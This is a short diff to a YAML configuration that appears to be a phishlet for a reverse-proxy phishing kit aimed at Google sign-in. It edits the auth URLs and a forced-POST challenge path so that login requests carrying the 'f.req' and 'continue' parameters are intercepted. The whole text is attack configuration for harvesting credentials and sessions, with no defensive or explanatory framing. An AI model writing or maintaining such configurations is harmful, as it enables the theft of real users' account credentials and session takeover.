@@ -71,7 +71,7 @@ credentials:
     type: 'post'
 
 auth_urls:
-  - '/CheckCookie'
+  #- '/CheckCookie'
   - '/_/AccountSettingsUi/browserinfo'
 
 login:
@@ -79,7 +79,7 @@ login:
   path: '/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
 
 force_post:
-  - path: '/_/signin/sl/challenge'
+  - path: '/_/signin/challenge'
     search:
       - {key: 'f.req', search: '.*'}
       - {key: 'continue', search: '.*'}
